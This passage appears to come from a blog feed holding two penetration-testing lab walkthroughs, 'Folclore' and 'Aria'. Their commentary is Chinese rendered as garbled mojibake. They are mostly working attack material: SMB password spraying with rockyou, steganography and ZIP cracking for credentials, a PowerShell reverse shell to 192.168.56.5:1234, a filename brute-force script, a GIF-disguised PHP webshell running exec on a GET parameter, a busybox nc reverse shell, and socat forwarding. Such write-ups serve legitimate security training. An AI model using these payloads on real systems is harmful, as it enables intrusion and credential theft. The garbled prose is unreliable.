SMB         192.168.56.101  445    FOLCLORE         513: FOLCLORE\Ninguno (SidTypeGroup)
SMB         192.168.56.101  445    FOLCLORE         1001: FOLCLORE\Quetzalcoatl (SidTypeUser)
SMB         192.168.56.101  445    FOLCLORE         1003: FOLCLORE\El_charro_negro (SidTypeUser)
SMB         192.168.56.101  445    FOLCLORE         1004: FOLCLORE\Ix_Chel (SidTypeUser)
SMB         192.168.56.101  445    FOLCLORE         1005: FOLCLORE\Tlaloc (SidTypeUser)
SMB         192.168.56.101  445    FOLCLORE         1006: FOLCLORE\La_mulata_de_Cordoba (SidTypeUser)
SMB         192.168.56.101  445    FOLCLORE         1007: FOLCLORE\La_Catrina (SidTypeUser)
```

ä½¿ç”¨å¾—åˆ°çš„ç”¨æˆ·åè¿›è¡Œå¯†ç çˆ†ç ´

```bash
âœ  Folclore cat user.txt                                                        
Administrador
Invitado
DefaultAccount
WDAGUtilityAccount
Ninguno
Quetzalcoatl
El_charro_negro
Ix_Chel
Tlaloc
La_mulata_de_Cordoba
La_Catrina
```

ç»è¿‡éœ€æ±‚å°è¯•åï¼Œå‘ç° `grep '[+]'` æ— æ³•åŒ¹é…å‡ºæ¥ï¼Œå› ä¸ºè´¦æˆ·å¯†ç è¿‡æœŸäº†.. éœ€è¦åŒ¹é… `grep -v 'STATUS_LOGON_FAILURE'` 

```bash
âœ  Folclore nxc smb 192.168.56.101 -u user.txt -p /usr/share/wordlists/rockyou.txt --ignore-pw-decoding --continue-on-success | grep -v 'STATUS_LOGON_FAILURE' 
SMB                      192.168.56.101  445    FOLCLORE         [*] Windows 10 / Server 2019 Build 19041 (name:FOLCLORE) (domain:Folclore) (signing:False) (SMBv1:False) 
SMB                      192.168.56.101  445    FOLCLORE         [-] Folclore\El_charro_negro:abc123 STATUS_PASSWORD_EXPIRED
```

ä¸ºäº†ç»§ç»­æ“ä½œï¼Œé€šè¿‡å›¾å½¢åŒ–ç•Œé¢å¯¹å¯†ç è¿›è¡Œäº†ä¿®æ”¹

![image.png](/post-images/TheHackersLabsFolclore/image1.png)

```bash
âœ  Folclore nxc smb 192.168.56.101 -u el_charro_negro -p abc1234                                                                                             
SMB         192.168.56.101  445    FOLCLORE         [*] Windows 10 / Server 2019 Build 19041 (name:FOLCLORE) (domain:Folclore) (signing:False) (SMBv1:False) 
SMB         192.168.56.101  445    FOLCLORE         [+] Folclore\el_charro_negro:abc1234
```

## å›¾ç‰‡éšå†™ - 1

é€šè¿‡è¯¥ç”¨æˆ·æšä¸¾ `SMB`ï¼Œèƒ½å¾—åˆ°ä¸€å¼ ç…§ç‰‡

![image.png](/post-images/TheHackersLabsFolclore/image2.png)

![image.png](/post-images/TheHackersLabsFolclore/image3.png)

ç›²çŒœæ˜¯å›¾ç‰‡éšå†™äº†

```bash
âœ  Folclore binwalk -Me --run-as=root El_Charro_Negro.jpeg                              

Scan Time:     2025-09-24 17:32:08
Target File:   /root/Desktop/TheHackersLabs/Folclore/El_Charro_Negro.jpeg
MD5 Checksum:  97f1dd191d3d9217ee0147f15a700c4f
Signatures:    436

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------

WARNING: One or more files failed to extract: either no utility was 
found or it's unimplemented

âœ  Folclore foremost El_Charro_Negro.jpeg   
Processing: El_Charro_Negro.jpeg
|*|

âœ  Folclore exiftool El_Charro_Negro.jpeg 
ExifTool Version Number         : 13.25
File Name                       : El_Charro_Negro.jpeg
Directory                       : .
File Size                       : 50 kB
File Modification Date/Time     : 2025:09:24 17:29:12+08:00
File Access Date/Time           : 2025:09:24 17:30:13+08:00
File Inode Change Date/Time     : 2025:09:24 17:29:12+08:00
File Permissions                : -rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
Exif Byte Order                 : Big-endian (Motorola, MM)
Y Cb Cr Positioning             : Centered
Copyright                       : El camino es largo pero no complicado. Busca a Ix Chel; ella tiene la siguiente pista aqui tienes la clave: 4+9Ii1wK
Image Width                     : 736
Image Height                    : 981
Encoding Process                : Progressive DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 736x981
Megapixels                      : 0.722
```

å¾—åˆ°ä¸€ä¸ªæç¤ºï¼š

![image.png](/post-images/TheHackersLabsFolclore/image4.png)

ç»™å‡ºä¸€ä¸ªå­—ç¬¦ä¸² `4+9Ii1wK` ï¼Œä¼°è®¡æ˜¯ä¸ªå¯†ç 

```bash
âœ  Folclore nxc smb 192.168.56.101 -u user.txt -p '4+9Ii1wK' --ignore-pw-decoding                                               
SMB         192.168.56.101  445    FOLCLORE         [*] Windows 10 / Server 2019 Build 19041 (name:FOLCLORE) (domain:Folclore) (signing:False) (SMBv1:False) 
SMB         192.168.56.101  445    FOLCLORE         [-] Folclore\Quetzalcoatl:4+9Ii1wK STATUS_LOGON_FAILURE 
SMB         192.168.56.101  445    FOLCLORE         [-] Folclore\El_charro_negro:4+9Ii1wK STATUS_LOGON_FAILURE 
SMB         192.168.56.101  445    FOLCLORE         [-] Folclore\Ix_Chel:4+9Ii1wK STATUS_PASSWORD_EXPIRED 
SMB         192.168.56.101  445    FOLCLORE         [-] Folclore\Tlaloc:4+9Ii1wK STATUS_LOGON_FAILURE 
SMB         192.168.56.101  445    FOLCLORE         [-] Folclore\La_mulata_de_Cordoba:4+9Ii1wK STATUS_LOGON_FAILURE 
SMB         192.168.56.101  445    FOLCLORE         [-] Folclore\La_Catrina:4+9Ii1wK STATUS_LOGON_FAILURE
```

æ˜¯ `Ix_Chel` çš„å¯†ç ï¼Œä¸è¿‡ä¹Ÿè¿‡æœŸäº†â€¦ é‡å¤ä¸Šè¾¹çš„æ“ä½œ

## å›¾ç‰‡éšå†™ - 2

ç„¶åå†æ¬¡æšä¸¾ SMB

![image.png](/post-images/TheHackersLabsFolclore/image5.png)

å¾—åˆ°ä¸€ä¸ª TXT æ–‡ä»¶ï¼Œåˆæ˜¯ä¸€ä¸ªå‡­æ® `677Kn$q`

```bash
âœ  Folclore cat La\ clave\ de\ KukulcÃ¡n.txt           
Recuerdo cuando conocÃ­ a KukulcÃ¡n, 
la serpiente emplumada que otros llaman QuetzalcÃ³atl; 
su mirada guardaba el misterio del viento y la sabidurÃ­a, 
y con una sonrisa me confiÃ³ que su clave mÃ¡s preciada tenÃ­a solo ocho caracteres, 
sencilla pero poderosa, como Ã©l mismo. Nuestros caminos se entrelazan: 
yo, guardiana de la luna y la vida; Ã©     l, 
portador del cielo y el conocimiento, unidos bajo el manto eterno de las estrellas. 
Ahora, sigue adelante, porque QuetzalcÃ³atl te espera. 
Continua buscando a TlÃ¡loc,te despejare el camino entregÃ¡     
ndote su clave: 677Kn$q."
```

å¯†ç æ˜¯ç”¨æˆ· `Tlaloc`  çš„

```bash
âœ  Folclore nxc smb 192.168.56.101 -u Tlaloc -p '677Kn$q' --ignore-pw-decoding
SMB         192.168.56.101  445    FOLCLORE         [*] Windows 10 / Server 2019 Build 19041 (name:FOLCLORE) (domain:Folclore) (signing:False) (SMBv1:False) 
SMB         192.168.56.101  445    FOLCLORE         [-] Folclore\Tlaloc:677Kn$q STATUS_PASSWORD_EXPIRED 
```

æšä¸¾ SMB

![image.png](/post-images/TheHackersLabsFolclore/image6.png)

ç…§ç‰‡ ++

![image.png](/post-images/TheHackersLabsFolclore/image7.png)

ç›²çŒœè¿˜æ˜¯éšå†™ï¼Œç›´æ¥é€šè¿‡ `stegseek` å¯ä»¥æ‹¿åˆ°æ–‡ä»¶

```bash
âœ  Folclore stegseek Tlaloc.jpg 
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: "knight"
[i] Original filename: "Las primeras seÃ±ales.txt".
[i] Extracting to "Tlaloc.jpg.out".
```

å‡­è¯ ++

```bash
âœ  Folclore cat Tlaloc.jpg.out 
He conseguido estos Ãºltimos dos caracteres para la clave de KukulcÃ¡n, 
la serpiente emplumada que llaman QuetzalcÃ³atl: 
%/. Te los entrego para que completes tu bÃºsqueda. 
AdemÃ¡s, aquÃ­ tienes otra clave, 
aunque debo confesar que no recuerdo a quiÃ©n pertenece exactamente: 
45yD#k7. ConfÃ­     a en tu instinto para usarla sabiamente.
```

## ZIP crack

æ˜¯ç”¨æˆ· `La_mulata_de_Cordoba` çš„å‡­æ®

```bash
âœ  Folclore nxc smb 192.168.56.101 -u La_mulata_de_Cordoba -p '45yD#k7'
SMB         192.168.56.101  445    FOLCLORE         [*] Windows 10 / Server 2019 Build 19041 (name:FOLCLORE) (domain:Folclore) (signing:False) (SMBv1:False) 
SMB         192.168.56.101  445    FOLCLORE         [-] Folclore\La_mulata_de_Cordoba:45yD#k7 STATUS_PASSWORD_EXPIRED
```

å†æšä¸¾ `SMB` ï¼Œä¸€ä¸ª txt ä¸€ä¸ª ZIP

![image.png](/post-images/TheHackersLabsFolclore/image8.png)

TXT å¾—åˆ°ä¸€ä¸ªè´¦æˆ· `La_Catrina:3nM93{S#`

```bash
âœ  Folclore cat Mi_amiga.txt                                                   
Mi amiga â€˜La Catrinaâ€™ me ha dejado su cuenta para que le ayude con algunos de sus trabajitos de vez en cuando. 
EscribirÃ© la clave aquÃ­ para no olvidarla: 3nM93{S#
```

Zip éœ€è¦å¯†ç 

```bash
âœ  Folclore unzip Pacto.zip 
Archive:  Pacto.zip
   skipping: Pacto.txt               need PK compat. v5.1 (can do v4.6)
```

é€šè¿‡ `John` è¿›è¡Œçˆ†ç ´

```bash
âœ  Folclore zip2john Pacto.zip > hash
âœ  Folclore john --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 256/256 AVX2 8x])
Cost 1 (HMAC size) is 238 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
celina           (Pacto.zip/Pacto.txt)     
1g 0:00:00:00 DONE (2025-09-24 18:26) 2.564g/s 42010p/s 42010c/s 42010C/s 123456..cocoliso
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

`7z` è¿›è¡Œè§£å‹

```bash
âœ  Folclore 7z x Pacto.zip 

7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29
 64-bit locale=zh_CN.UTF-8 Threads:128 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 432 bytes (1 KiB)

Extracting archive: Pacto.zip
--
Path = Pacto.zip
Type = zip
Physical Size = 432

    
Enter password (will not be echoed):
Everything is Ok

Size:       358
Compressed: 432
```

å¾—åˆ°ä¸€ä¸ªç¥ç§˜å­—ç¬¦ä¸² `J9c`

```bash
âœ  Folclore cat Pacto.txt 
Has surcado sendas que pocos se atreven a cruzar, 
pero tu viaje no concluye todavÃ­a. Invocando mis artes prohibidas, 
logrÃ© hechizar a la serpiente emplumada y robarle apenas el inicio de su secreto: 
sÃ³lo tres caracteres fui capaz de obtener. 
Ahora los deposito en tus manos, 
pero escucha el viento y no olvides la deuda que ahora te ata a mi sombra: J9c.
```

æˆ‘ä»¬æ£€æŸ¥ä¸€ä¸‹ä¸Šé¢å¾—åˆ°çš„ç”¨æˆ·èƒ½åšçš„äº‹æƒ…ï¼Œè¿˜æ˜¯ä¸€ä¸ª `txt`

![image.png](/post-images/TheHackersLabsFolclore/image9.png)

```bash
âœ  Folclore cat Ultimo_mensaje.txt 
Solo puedo darte el quinto carÃ¡cter de su clave: â€˜Uâ€™. 
Los demÃ¡s caracteres que faltan deberÃ¡s encontrarlos por tu cuenta, 
aunque no debe ser tan difÃ­cil; solo son nÃºmeros o letras. 
ConfÃ­a en tu ingenio y no olvides que el misterio siempre se revela a quien persevera.
```

## å¯†ç çˆ†ç ´

é›†åˆä¸Šè¾¹çš„å¾—åˆ°å‡ ä¸ª`txt`ï¼Œå¾—åˆ°å¯†ç åº”è¯¥æ˜¯ `J9c?U?%/`ï¼Œç¬¬å››ä¸ªå­—æ¯éœ€è¦æˆ‘ä»¬è¿›è¡Œçˆ†ç ´

```bash
âœ  Folclore for char1 in {a..z} {A..Z} {0..9}; do printf "J9c%sU%s%%/\n" "$char1" "$char1"; done > wordlist.txt 
```

å¾—åˆ°å‡­æ® `Quetzalcoatl:J9c7U7%/`

```bash
âœ  Folclore nxc smb 192.168.56.101 -u user.txt -p wordlist.txt --ignore-pw-decoding --continue-on-success | grep -v 'STATUS_LOGON_FAILURE'
SMB                      192.168.56.101  445    FOLCLORE         [*] Windows 10 / Server 2019 Build 19041 (name:FOLCLORE) (domain:Folclore) (signing:False) (SMBv1:False) 
SMB                      192.168.56.101  445    FOLCLORE         [+] Folclore\Ninguno:J9caUa%/ (Guest)
SMB                      192.168.56.101  445    FOLCLORE         [+] Folclore\Quetzalcoatl:J9c7U7%/
```

SMB æšä¸¾â€¦

![image.png](/post-images/TheHackersLabsFolclore/image10.png)

## xxxxx

æŸ¥çœ‹å¾—åˆ°çš„  `txt`

```bash
âœ  Folclore cat /root/.nxc/modules/nxc_spider_plus/192.168.56.101/Viento/Serpiente\ Emplumada.txt 
Has recorrido con valentÃ­a y sabidurÃ­a un sendero lleno de retos; te felicito, guerrero del destino.
Ahora, confÃ­a en mÃ­, QuetzalcÃ³atl, la serpiente emplumada, pues serÃ© yo quien te otorgue el acceso necesario. 
Solo ejecutarÃ© una vez aquel archivo PowerShell que decidas subir, para abrir el portal hacia lo que buscas. 
Que esta acciÃ³n sea el puente que te lleve a la verdad escondida entre los vientos y las estrellas.# 
```

è¡¨ç¤ºæˆ‘ä»¬å¯ä»¥ä¸Šä¼  `Powershell` æ–‡ä»¶ä¸€æ¬¡

![image.png](/post-images/TheHackersLabsFolclore/image11.png)

å°†ä¸‹é¢çš„ä»£ç ä¿å­˜ä¸º `xxx.ps1` ç„¶åè¿›è¡Œä¸Šä¼ 

```bash
$client = New-Object Net.Sockets.TCPClient('192.168.56.5',1234);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

```bash
smbclient //192.168.56.101/viento -U Quetzalcoatl%'J9c7U7%/'
put shell.ps1
```

ç­‰å¾…å¼¹å›æ¥

![image.png](/post-images/TheHackersLabsFolclore/image12.png)

è¯»å– `User.txt`

```bash
PS C:\Users\Quetzalcoatl\Desktop> type User.txt
456e20656c207669656e746f2079616365206c6120766572646164
```

ä¸ºäº†æ–¹ä¾¿æ“ä½œè¿ç§»åˆ° `msf` 

![image.png](/post-images/TheHackersLabsFolclore/image13.png)

ä¸Šæ¥åé€šè¿‡ winpeas ç­‰æšä¸¾äº†è®¸å¤šï¼Œä½†æ˜¯æ²¡æ‰¾åˆ°å¯ä»¥åˆ©ç”¨çš„

æœ€åå¯ä»¥åœ¨ `Downloads\Actualizacion` ä¸­æ‰¾åˆ°ç®¡ç†å‘˜å¯†ç 

```bash
C:\Users\Quetzalcoatl\Downloads\Actualizacion>type Venganza.txt
type Venganza.txt
He conseguido la clave del administrador!!!
La guardare para no olvidarla: xxxxxxxx
```

```bash
âœ  Folclore nxc smb 192.168.56.101 -u 'administrador' -p 'xxxxxx*'                        
SMB         192.168.56.101  445    FOLCLORE         [*] Windows 10 / Server 2019 Build 19041 (name:FOLCLORE) (domain:Folclore) (signing:False) (SMBv1:False)
SMB         192.168.56.101  445    FOLCLORE         [+] Folclore\administrador:xxxxxx (Pwn3d!)
```

æ‹¿ `root.txt` ï¼Œç›´æ¥è¯»å°±ç®—äº†ï¼Œæ‡’å¾—æ‹¿ `shell` äº†

![image.png](/post-images/TheHackersLabsFolclore/image14.png)

## æ€»ç»“

ä½“éªŒä¸ç®—å¥½
]]></content:encoded>
            <category>é¶æœº</category>
            <category>TheHackersLabs</category>
            <category>Windows</category>
            <category>MISC</category>
        </item>
        <item>
            <title><![CDATA[HackMyVM - Aria]]></title>
            <link>https://www.sunsetaction.top/2025/09/23/HackMyVMAria</link>
            <guid isPermaLink="false">https://www.sunsetaction.top/2025/09/23/HackMyVMAria</guid>
            <pubDate>Tue, 23 Sep 2025 00:00:00 GMT</pubDate>
            <description><![CDATA[Aria. https://hackmyvm.eu/machines/machine.php?vm=Aria Recon ç«¯å£æ‰«æ 80 ç«¯å£ ç»™å‡ºäº†ä¸€ç‚¹ä¿¡æ¯ é€šè¿‡ md5(time()Â·rand(1,1000)) ç”Ÿæˆä¸å¯é¢„æµ‹çš„æ–‡ä»¶å å¹¶ä¸”æ–‡ä»¶å†…å®¹ä¸å¯åŒ…å« <?php ä»¥åŠæ–‡ä»¶åä»…ä»…å¯ä»¥æ˜¯ gif...]]></description>
            <content:encoded><![CDATA[
# Aria.

> https://hackmyvm.eu/machines/machine.php?vm=Aria
> 

![image.png](/post-images/HackMyVMAria/image.png)

## Recon

### ç«¯å£æ‰«æ

```bash
âœ  Aria nmap -sT -min-rate 10000 -p- 192.168.56.214
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-22 23:23 CST
Nmap scan report for 192.168.56.214
Host is up (0.00037s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
1337/tcp open  waste
MAC Address: 08:00:27:9A:02:64 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 17.23 seconds
```

```bash
âœ  Aria nmap -sT -A -p 22,80,1337 192.168.56.214
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-22 23:25 CST
Nmap scan report for 192.168.56.214
Host is up (0.00056s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey:
|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)
|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)
|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)
80/tcp   open  http    Apache httpd 2.4.62 ((Debian))
|_http-title: Ultra-Secure Naming Service
|_http-server-header: Apache/2.4.62 (Debian)
1337/tcp open  waste?
| fingerprint-strings:
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, NULL, RPCCheck:
|     --- Aria Debug Shell ---
|     Type 'exit' to quit ---
|   GenericLines:
```

### 80 ç«¯å£

ç»™å‡ºäº†ä¸€ç‚¹ä¿¡æ¯

- é€šè¿‡ `md5(time()Â·rand(1,1000))` ****ç”Ÿæˆä¸å¯é¢„æµ‹çš„æ–‡ä»¶å
- å¹¶ä¸”æ–‡ä»¶å†…å®¹ä¸å¯åŒ…å« `<?php`
- ä»¥åŠæ–‡ä»¶åä»…ä»…å¯ä»¥æ˜¯ gif / jpg / png

![image.png](/post-images/HackMyVMAria/image1.png)

`<?php` å¯ä»¥é€šè¿‡ `<?=` æ¥ç»•è¿‡ï¼Œæ–‡ä»¶åå¯ä»¥é€šè¿‡ `GIF89a` ï¼Œä½†æ˜¯ä¸å¯é¢„æµ‹æ–‡ä»¶åéœ€è¦æƒ³åŠæ³•

### 1337 ç«¯å£

æ‰«æå‡ºæ¥å¾ˆå¥‡æ€ªï¼Œ`nc` ä¸€ä¸‹

```
âœAria nc 192.168.56.214 1337
--- Aria Debug Shell ---
--- Type 'exit' to quit ---

$ help
This shell aids admins in debugging Aria services.
Use specific commands to view logs or hidden path.
Note: Web interface also provides foothold access.
```

> æ­¤ Shell å¯å¸®åŠ©ç®¡ç†å‘˜è°ƒè¯• Aria æœåŠ¡ã€‚
ä½¿ç”¨ç‰¹å®šå‘½ä»¤æŸ¥çœ‹æ—¥å¿—æˆ–éšè—è·¯å¾„ã€‚
æ³¨æ„ï¼šWeb ç•Œé¢ä¹Ÿæä¾›ç«‹è¶³ç‚¹è®¿é—®æƒé™ã€‚
> 

å¤§æ¦‚æ˜¯å¯ä»¥é€šè¿‡ç‰¹å®šå‘½ä»¤æ¥æŸ¥çœ‹æ—¥å¿—æˆ–éšè—è·¯å¾„

```bash
$ path
You're close! Try a command related to revealing paths.
$ path ls
You're close! Try a command related to revealing paths.
$ path dir
You're close! Try a command related to revealing paths.
$ path upload
You're close! Try a command related to revealing paths.
$ path ls -al
You're close! Try a command related to revealing paths.
$ path ls path
You're close! Try a command related to revealing paths.
$ path ll
You're close! Try a command related to revealing paths.
```

æƒ³ä¸åˆ°ï¼Œå†çœ‹çœ‹ `web` ç«¯

![image.png](/post-images/HackMyVMAria/image2.png)

### çˆ†ç ´

å—ä¸äº†ï¼Œç›´æ¥è·Ÿå®ƒçˆ†äº†

![BOOM-4x (2).gif](/post-images/HackMyVMAria/BOOM-4x_(2).gif)

```bash
import time
import hashlib
import requests
from datetime import datetime

# --- é…ç½®åŒº ---
TARGET_IP = '192.168.56.214'
TARGET_PATH = '/uploads/'
FILE_EXTENSION = '.gif'
BASE_URL = f"http://{TARGET_IP}{TARGET_PATH}"

# æ—¶é—´èŒƒå›´ï¼ˆç§’ï¼‰ã€‚ä¾‹å¦‚ 10 è¡¨ç¤ºä»å½“å‰æ—¶é—´çš„å‰10ç§’åˆ°å10ç§’
TIME_WINDOW_SECONDS = 10
# éšæœºæ•°èŒƒå›´
RAND_MIN = 1
RAND_MAX = 1000

# --- è„šæœ¬æ ¸å¿ƒé€»è¾‘ ---

def main():
    """ä¸»æ‰§è¡Œå‡½æ•°"""
    # è®¡ç®—èµ·å§‹å’Œç»“æŸæ—¶é—´æˆ³
    current_time = int(time.time())
    start_time = current_time - TIME_WINDOW_SECONDS
    end_time = current_time + TIME_WINDOW_SECONDS

    # æ‰“å°ä»»åŠ¡ä¿¡æ¯
    print("=" * 52)
    print("å¼€å§‹çˆ†ç ´...")
    print(f"ç›®æ ‡ä¸»æœº: {BASE_URL}")
    print("æˆåŠŸæ¡ä»¶: å“åº”çŠ¶æ€ç ä¸ä¸º 404")
    print(f"æ—¶é—´èŒƒå›´: {datetime.fromtimestamp(start_time)} -> {datetime.fromtimestamp(end_time)}")
    print(f"éšæœºæ•°èŒƒå›´: {RAND_MIN} - {RAND_MAX}")
    total_attempts = (end_time - start_time + 1) * RAND_MAX
    print(f"é¢„è®¡æ€»å°è¯•æ¬¡æ•°: {total_attempts:,}")
    print("=" * 52)

    # ä½¿ç”¨ requests.Session() å¯ä»¥å¤ç”¨TCPè¿æ¥ï¼Œæé«˜æ•ˆç‡
    session = requests.Session()
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
    }) # æ·»åŠ ä¸€ä¸ªå¸¸è§çš„User-Agentï¼Œé¿å…è¢«ä¸€äº›ç®€å•çš„WAFæ‹¦æˆª
    
    found = False
    counter = 0

    try:
        # å¤–å±‚å¾ªç¯éå†æ—¶é—´æˆ³
        for t in range(start_time, end_time + 1):
            # å†…å±‚å¾ªç¯éå†éšæœºæ•°
            for r in range(RAND_MIN, RAND_MAX + 1):
                # 1. ç”ŸæˆåŸå§‹å­—ç¬¦ä¸²
                original_string = f"{t}{r}"
                
                # 2. è®¡ç®— MD5 å“ˆå¸Œ
                md5_hash = hashlib.md5(original_string.encode('utf-8')).hexdigest()
                
                # 3. æ„é€ å®Œæ•´çš„ URL
                url = f"{BASE_URL}{md5_hash}{FILE_EXTENSION}"
                
                # å®æ—¶æ˜¾ç¤ºè¿›åº¦
                counter += 1
                if counter % 500 == 0:
                    print(f"å·²å°è¯• {counter:,} æ¬¡, å½“å‰æ—¶é—´æˆ³: {t}    ", end='\r')

                try:
                    # 4. å‘é€ HEAD è¯·æ±‚æ£€æŸ¥
                    response = session.head(url, timeout=2, allow_redirects=True) # allow_redirects=True å¯ä»¥è·Ÿéšé‡å®šå‘
                    
                    # 5. åˆ¤æ–­çŠ¶æ€ç  - å¦‚æœå“åº”ä¸æ˜¯ 404 Not Foundï¼Œå°±è®¤ä¸ºæ˜¯æˆåŠŸ
                    if response.status_code != 404:
                        print("\n\n[+] æˆåŠŸï¼å‘ç°ä¸€ä¸ªé 404 å“åº”ï¼")
                        print(f"[+] çŠ¶æ€ç : {response.status_code}") # æ‰“å°å®é™…çš„çŠ¶æ€ç 
                        print(f"[+] URL: {url}")
                        print(f"[+] ç”Ÿæˆæº: æ—¶é—´æˆ³={t}, éšæœºæ•°={r}")
                        found = True
                        return # æ‰¾åˆ°åç›´æ¥é€€å‡ºå‡½æ•°
                        
                except requests.exceptions.RequestException:
                    continue

    except KeyboardInterrupt:
        print("\n\n[!] ç”¨æˆ·æ‰‹åŠ¨ä¸­æ–­äº†è„šæœ¬ã€‚")
    finally:
        print("\n" + "=" * 52)
        if not found:
            print("çˆ†ç ´å®Œæˆï¼Œæœªæ‰¾åˆ°æœ‰æ•ˆæ–‡ä»¶ã€‚")
        print("è„šæœ¬æ‰§è¡Œç»“æŸã€‚")
        print("=" * 52)

if __name__ == "__main__":
    main()

```

æµ‹è¯•ä¸€ä¸‹

```bash
------geckoformboundary4729ee082d4576ee3503c0196092f36c
Content-Disposition: form-data; name="file"; filename="nneo.gif"
Content-Type: image/gif

GIF89a

------geckoformboundary4729ee082d4576ee3503c0196092f36c--
```

![image.png](/post-images/HackMyVMAria/image3.png)

å†™é©¬å­

```bash
------geckoformboundary4729ee082d4576ee3503c0196092f36c
Content-Disposition: form-data; name="file"; filename="nneo.gif"
Content-Type: image/gif

GIF89a
<?= phpinfo();exec($_GET['x']); ?>

------geckoformboundary4729ee082d4576ee3503c0196092f36c--
```

é€šè¿‡é©¬å­å¼¹ä¸ª `shell`

```bash
?x=busybox+nc+192.168.56.5+1234+-e+%2Fbin%2Fbash
```

![image.png](/post-images/HackMyVMAria/image4.png)

å¯ä»¥æ‹¿åˆ° `user.txt`

```bash
cat user.txt
flag{user-d13adadc6bbc1391394a5198cba2d1d7}
```

## ææƒ

### ä¿¡æ¯æ”¶é›†

é¦–å…ˆæ‹¿åˆ°å®Œæ•´ shell ï¼ˆç•¥ï¼‰

æŸ¥çœ‹æ­£åœ¨ç›‘å¬ç«¯å£ï¼Œå‘ç°æœ¬åœ°å¼€ç€ `6800`

```bash
www-data@Aria:/$ ss -tulpn
Netid   State    Recv-Q   Send-Q     Local Address:Port     Peer Address:Port   
udp     UNCONN   0        0                0.0.0.0:68            0.0.0.0:*      
tcp     LISTEN   0        5                0.0.0.0:1337          0.0.0.0:*      
tcp     LISTEN   0        128            127.0.0.1:6800          0.0.0.0:*      
tcp     LISTEN   0        128              0.0.0.0:22            0.0.0.0:*      
tcp     LISTEN   0        128                    *:80                  *:*      
tcp     LISTEN   0        128                [::1]:6800             [::]:*      
tcp     LISTEN   0        128                 [::]:22               [::]:* 
```

é€šè¿‡ socat è½¬å‘å‡ºå»

```bash
www-data@Aria:/tmp$ ./socat TCP-LISTEN:6801,fork TCP4:127.0.0.1:6800 &
[1] 25929
```

ä½†è²Œä¼¼å¹¶ä¸æ˜¯ HTTP æœåŠ¡ï¼Œç»“åˆå§å”§åç§°å’Œæœç´¢å¼•æ“ï¼Œå¤§è‡´ç¡®å®šæ˜¯ aria2 çš„ RPC ç«¯å£ï¼Œåº”è¯¥èƒ½ä»ä¸Šé¢æ‹¿åˆ°ä»€ä¹ˆæ–‡ä»¶

> Aria2 æ˜¯ä¸€æ¬¾è‡ªç”±ã€è·¨å¹³å°å‘½ä»¤è¡Œç•Œé¢çš„ä¸‹è½½ç®¡ç†å™¨ï¼Œè¯¥è½¯ä»¶æ ¹æ® GPLv2 è®¸å¯è¯è¿›è¡Œåˆ†å‘
> 

### Aria2 PRC - 1

æ‰¾åˆ°å®˜æ–¹æ–‡æ¡£ï¼Œæµ‹è¯•ä¸€ä¸‹ PRC æ¥å£

> https://aria2.github.io/manual/en/html/aria2c.html#terminology | https://aria2.github.io/manual/en/html/aria2c.html#json-rpc-over-websocket
> 

æµ‹è¯•ï¼Œç¡®å®æœ‰å›æ˜¾

```bash
âœ  Aria curl 192.168.56.116:6801/jsonrpc
{"id":null,"jsonrpc":"2.0","error":{"code":-32600,"message":"Invalid Request."}}# 
```

æµ‹è¯•ä¸€ä¸‹æ–¹æ³•ï¼Œå‘ç°éœ€è¦è®¤è¯

> è¦ä½¿ç”¨ RPC æ–¹æ³•çº§æˆæƒï¼Œç”¨æˆ·å¿…é¡»ä½¿ç”¨Â **`--rpc-secret`**Â é€‰é¡¹æŒ‡å®š RPC ç§˜å¯†æˆæƒä»¤ç‰Œ
> 

```bash
âœ  Aria curl '192.168.56.116:6801/jsonrpc?method=aria2.tellStatus&id=foo'                                   
{"id":"foo","jsonrpc":"2.0","error":{"code":1,"message":"Unauthorized"}}# 
```

### é›¶å®½åº¦å­—ç¬¦

æ‰€ä»¥ç°åœ¨çš„ç›®æ ‡æ˜¯è¦æ‰¾åˆ° `Token`

æœ€åå‘ç° `user.txt` ä¸æ­£å¸¸

![image.png](/post-images/HackMyVMAria/image5.png)

